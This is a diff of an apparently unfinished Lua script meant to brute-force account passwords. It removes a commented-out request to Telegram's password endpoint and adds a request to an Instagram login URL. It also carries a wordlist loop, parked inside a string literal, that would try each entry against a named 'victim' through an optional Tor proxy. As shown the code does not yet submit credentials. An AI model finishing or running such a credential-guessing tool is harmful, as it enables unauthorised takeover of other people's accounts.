@@ -38,18 +38,19 @@ local request_headers = {
 }
 
 
-local function attack(victim, wordlist, tor)
-	print(victim .. wordlist .. tor)
-	--local request_payload = [[phone=]] .. password
-	--local request_response = {}
-	--local request = http.request {
-	--	url = 'https://my.telegram.org/auth/send_password',
-	--	method = "POST",
-	--	source = ltn12.source.string(request_payload),
-	--	sink = ltn12.sink.table(request_response)
-	--}
-	--request_response = table.concat(request_response)
-	---- print(login_response)
+local function attack(victim, wordlist, tor, password)
+	local request_response = {}
+	local body, code, headers, status = http.request {
+		url = instagram_url_login,
+		method = "GET",
+		headers = request_headers,
+		--source = ltn12.source.string(request_payload),
+		sink = ltn12.sink.table(request_response)
+	}
+	print('body:' .. tostring(body))
+	print('code:' .. tostring(code))
+	print('status:' .. tostring(status))
+	print(table.concat(request_response))
 end
 
 local function main() 
@@ -71,6 +72,24 @@ local function main()
 		os.exit(0)
 	end)
 	local args = parser:parse()
-	--attack(args.target, args.wordlist, args.proxy)	
+	attack('hello', 'Hello', 'disable', 'hack')
+	--local open = io.open(args.wordlist, 'r')
+	local test = [[if open then
+		for brute in io.lines(args.wordlist) do
+			attack(args.target, args.wordlist, args.proxy, brute)	
+		end
+	else
+		print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
+		local open_txt = io.open(args.wordlist .. ".txt")
+		if open_txt then
+			for brute in io.lines(args.wordlist .. ".txt") do
+				attack(args.target, args.wordlist, args.proxy, brute)
+			end
+		else
+			print("[-] wordlist file path doesn't found")
+			os.exit(0)
+		end
+	end]]
 end
+
 main()
